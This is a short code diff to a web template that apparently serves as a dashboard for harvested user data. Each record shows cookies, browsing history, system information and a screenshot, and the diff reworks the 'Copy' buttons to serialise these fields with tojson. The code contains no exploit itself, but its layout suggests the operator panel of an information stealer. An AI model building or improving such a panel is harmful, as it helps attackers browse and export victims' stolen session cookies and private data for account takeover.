@@ -15,15 +15,15 @@
 
         <h3>Cookies</h3>
         <div class="json-box">{{ user[2] }}</div>
-        <button class="action-btn" onclick="copyText('{{ user[2]|escapejs }}')">Copy Cookies</button>
+        <button class="action-btn" onclick="copyText({{ user[2]|tojson }})">Copy Cookies</button>
 
         <h3>History</h3>
         <div class="json-box">{{ user[3] }}</div>
-        <button class="action-btn" onclick="copyText('{{ user[3]|escapejs }}')">Copy History</button>
+        <button class="action-btn" onclick="copyText({{ user[3]|tojson }})">Copy History</button>
 
         <h3>System Info</h3>
         <div class="json-box">{{ user[4] }}</div>
-        <button class="action-btn" onclick="copyText('{{ user[4]|escapejs }}')">Copy System Info</button>
+        <button class="action-btn" onclick="copyText({{ user[4]|tojson }})">Copy System Info</button>
 
         {% if user[5] %}
         <h3>Screenshot</h3>
@@ -54,7 +54,9 @@ span.onclick = function() { modal.style.display = "none"; }
 window.onclick = function(event) { if(event.target == modal){ modal.style.display = "none"; } }
 
 function copyText(text){
-    navigator.clipboard.writeText(text).then(()=>alert("Copied to clipboard!"));
+    navigator.clipboard.writeText(
+        typeof text === "string" ? text : JSON.stringify(text, null, 2)
+    ).then(()=>alert("Copied to clipboard!"));
 }
 
 function downloadImage(base64, filename){
